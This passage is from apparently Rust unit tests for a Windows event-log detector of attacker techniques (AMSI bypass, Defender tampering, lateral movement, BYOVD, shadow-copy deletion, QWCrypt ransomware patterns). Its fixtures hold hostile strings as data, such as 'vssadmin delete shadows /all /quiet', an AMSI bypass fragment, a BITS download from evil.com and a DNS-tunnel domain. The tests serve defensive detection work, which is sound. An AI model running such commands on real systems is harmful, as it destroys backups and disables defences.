        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1218");
    }

    #[test]
    fn amsi_bypass_detected_on_script_block() {
        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational", vec![("ScriptBlockText","[Ref].Assembly.GetType(amsiInitFailed)")], 1_000_000_000)];
        let hits = detect_amsi_bypass(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1562.001");
    }

    #[test]
    fn defender_tampering_detected_on_disable_realtime() {
        let ev = vec![make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 1_000_000_000)];
        let hits = detect_defender_tampering(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1562.001");
    }

    #[test]
    fn smb_lateral_movement_detected_on_type3_plus_5140() {
        let ts = 1_000_000_000_i64;
        let mut ld: HashMap<String,String> = HashMap::new();
        ld.insert("LogonType".into(), "3".into());
        ld.insert("IpAddress".into(), "10.0.0.5".into());
        ld.insert("TargetLogonId".into(), "0x1234".into());
        let mut sd: HashMap<String,String> = HashMap::new();
        sd.insert("ShareName".into(), "\\\\*\\ADMIN$".into());
        sd.insert("SubjectLogonId".into(), "0x1234".into());
        let events = vec![
            EvtxEvent { event_id: 4624, channel: "Security".into(), timestamp_ns: ts, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: ld },
            EvtxEvent { event_id: 5140, channel: "Security".into(), timestamp_ns: ts+1000, computer: "WS01".into(), user_sid: None, logon_id: Some(0x1234), process_id: None, thread_id: None, data: sd },
        ];
        let hits = detect_smb_lateral_movement(&events);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1021.002");
    }

    #[test]
    fn pass_the_hash_detected_on_logontype9() {
        let ev = vec![make_event(4624, "Security", vec![("LogonType","9"),("AuthenticationPackageName","NTLM"),("TargetUserName","Administrator")], 1_000_000_000)];
        let hits = detect_pass_the_hash(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1550.002");
    }

    #[test]
    fn bits_persistence_detected_on_eid_59() {
        let ev = vec![make_event(59, "Microsoft-Windows-Bits-Client/Operational", vec![("url","http://evil.com/payload.exe")], 1_000_000_000)];
        let hits = detect_bits_persistence(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1197");
    }

    #[test]
    fn compression_staging_detected_on_7z() {
        let ev = vec![make_event(1, "Microsoft-Windows-Sysmon/Operational", vec![("Image","C:\\Program Files\\7-Zip\\7z.exe"),("CommandLine","7z.exe a exfil.7z C:\\sensitive\\")], 1_000_000_000)];
        let hits = detect_compression_staging(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1560.001");
    }

    #[test]
    fn dns_exfil_detected_on_high_entropy_subdomain() {
        let ev = vec![make_event(22, "Microsoft-Windows-Sysmon/Operational", vec![("QueryName","aGVsbG93b3JsZHRlc3RkYXRh.evil-tunnel.com")], 1_000_000_000)];
        let hits = detect_dns_cloud_exfil(&ev);
        assert!(!hits.is_empty());
        assert_eq!(hits[0].mitre_technique_id, "T1048.003");
    }

    #[test]
    fn run_all_detectors_empty_events_returns_empty() {
        assert!(run_all_detectors(&[]).is_empty());
    }

    #[test]
    fn run_all_detectors_aggregates_multiple_detections() {
        let events = vec![
            make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000),
            make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 2_000),
        ];
        assert!(run_all_detectors(&events).len() >= 2);
    }

    // ── QWCrypt / RedCurl detection tests (RED) ──────────────────────────────

    #[test]
    fn byovd_zemana_driver_install_detected() {
        let ev = vec![make_event(7045, "System",
            vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
            1_000_000_000)];
        let hits = detect_byovd_driver_install(&ev);
        assert!(!hits.is_empty(), "Zemana driver install must be detected");
        assert_eq!(hits[0].mitre_technique_id, "T1068");
    }

    #[test]
    fn byovd_unknown_service_not_detected() {
        let ev = vec![make_event(7045, "System",
            vec![("ServiceName","VGAuthService"),("ImagePath","C:\\VMTools\\vmtools.dll")],
            1_000)];
        assert!(detect_byovd_driver_install(&ev).is_empty());
    }

    #[test]
    fn byovd_empty_events() { assert!(detect_byovd_driver_install(&[]).is_empty()); }

    #[test]
    fn vss_deletion_detected_on_eid_8193() {
        let ev = vec![make_event(8193, "Application",
            vec![("Message","VSS error deleting shadow copy")],
            1_000_000_000)];
        let hits = detect_vss_deletion(&ev);
        assert!(!hits.is_empty(), "VSS EID 8193 must be detected");
        assert_eq!(hits[0].mitre_technique_id, "T1490");
    }

    #[test]
    fn vss_deletion_detected_on_eid_524() {
        let ev = vec![make_event(524, "Application",
            vec![("Message","Volume Shadow Copy snapshot deleted")],
            1_000_000_000)];
        let hits = detect_vss_deletion(&ev);
        assert!(!hits.is_empty(), "VSS EID 524 must be detected");
    }

    #[test]
    fn vss_deletion_empty_events() { assert!(detect_vss_deletion(&[]).is_empty()); }

    #[test]
    fn hyperv_mass_state_change_detected_on_three_vms() {
        let ns = 1_000_000_000_i64;
        let ev = vec![
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Alpha")], 10 * ns),
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Beta")], 20 * ns),
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Gamma")], 30 * ns),
        ];
        let hits = detect_hyperv_mass_state_change(&ev);
        assert!(!hits.is_empty(), "3+ unique VMs stopping must trigger detection");
        assert_eq!(hits[0].mitre_technique_id, "T1486");
    }

    #[test]
    fn hyperv_single_vm_not_detected() {
        let ev = vec![make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
            vec![("VmName","VM-Alpha")], 1_000_000_000)];
        assert!(detect_hyperv_mass_state_change(&ev).is_empty());
    }

    #[test]
    fn hyperv_mass_state_change_empty_events() {
        assert!(detect_hyperv_mass_state_change(&[]).is_empty());
    }

    #[test]
    fn wmi_lateral_movement_detected_on_5858_remote() {
        let ev = vec![make_event(5858, "Microsoft-Windows-WMI-Activity/Operational",
            vec![("ClientMachine","\\\\VICTIM-PC"),("User","CORP\\attacker"),
                 ("Operation","Provider::ExecQuery - root\\cimv2 : SELECT * FROM Win32_Process")],
            1_000_000_000)];
        let hits = detect_wmi_lateral_movement(&ev);
        assert!(!hits.is_empty(), "Remote WMI failure must be detected");
        assert_eq!(hits[0].mitre_technique_id, "T1047");
    }

    #[test]
    fn wmi_lateral_movement_detected_on_5857_remote() {
        let ev = vec![make_event(5857, "Microsoft-Windows-WMI-Activity/Operational",
            vec![("ClientMachine","\\\\VICTIM-PC"),("User","CORP\\attacker")],
            1_000_000_000)];
        let hits = detect_wmi_lateral_movement(&ev);
        assert!(!hits.is_empty(), "Remote WMI query must be detected");
    }

    #[test]
    fn wmi_lateral_movement_local_not_detected() {
        let ev = vec![make_event(5858, "Microsoft-Windows-WMI-Activity/Operational",
            vec![("ClientMachine","localhost"),("User","NT AUTHORITY\\SYSTEM")],
            1_000)];
        assert!(detect_wmi_lateral_movement(&ev).is_empty());
    }

    #[test]
    fn wmi_lateral_movement_empty_events() {
        assert!(detect_wmi_lateral_movement(&[]).is_empty());
    }

    #[test]
    fn qwcrypt_ps_stopvm_detected_in_script_block() {
        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
            vec![("ScriptBlockText","Stop-VM -Name 'VM-Alpha' -Force -TurnOff")],
            1_000_000_000)];
        let hits = detect_qwcrypt_ps_patterns(&ev);
        assert!(!hits.is_empty(), "Stop-VM in script block must be detected");
        assert_eq!(hits[0].mitre_technique_id, "T1059.001");
    }

    #[test]
    fn qwcrypt_ps_vssadmin_detected_in_script_block() {
        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
            vec![("ScriptBlockText","vssadmin delete shadows /all /quiet")],
            1_000_000_000)];
        let hits = detect_qwcrypt_ps_patterns(&ev);
        assert!(!hits.is_empty(), "vssadmin delete shadows must be detected");
    }

    #[test]
    fn qwcrypt_ps_benign_script_not_detected() {
        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
            vec![("ScriptBlockText","Get-Process | Where-Object { $_.CPU -gt 50 }")],
            1_000)];
        assert!(detect_qwcrypt_ps_patterns(&ev).is_empty());
    }

    #[test]
    fn qwcrypt_ps_empty_events() { assert!(detect_qwcrypt_ps_patterns(&[]).is_empty()); }

    #[test]
    fn security_task_created_detected_on_4698() {
        let ev = vec![make_event(4698, "Security",
            vec![("TaskName","\\Maintenance\\UpdateChecker"),
                 ("SubjectUserName","SYSTEM"),
                 ("TaskContent","<Actions><Exec><Command>C:\\Temp\\evil.exe</Command></Exec></Actions>")],
            1_000_000_000)];
        let hits = detect_security_task_created(&ev);
        assert!(!hits.is_empty(), "Security EID 4698 task creation must be detected");
        assert_eq!(hits[0].mitre_technique_id, "T1053.005");
    }

    #[test]
    fn security_task_created_empty_events() {
        assert!(detect_security_task_created(&[]).is_empty());
    }

    #[test]
    fn qwcrypt_cluster_detected_on_byovd_plus_hyperv() {
        let ns = 1_000_000_000_i64;
        let ev = vec![
            make_event(7045, "System",
                vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
                10 * ns),
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Alpha")], 20 * ns),
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Beta")], 30 * ns),
            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
                vec![("VmName","VM-Gamma")], 40 * ns),
        ];
        let hits = detect_qwcrypt_cluster(&ev);
        assert!(!hits.is_empty(), "BYOVD + Hyper-V mass shutdown must trigger QWCrypt cluster");
        assert_eq!(hits[0].confidence, Confidence::High);
    }

    #[test]
    fn qwcrypt_cluster_byovd_alone_not_sufficient() {
        let ev = vec![make_event(7045, "System",
            vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
            1_000_000_000)];
        assert!(detect_qwcrypt_cluster(&ev).is_empty());
    }

    #[test]
    fn qwcrypt_cluster_empty_events() { assert!(detect_qwcrypt_cluster(&[]).is_empty()); }
}
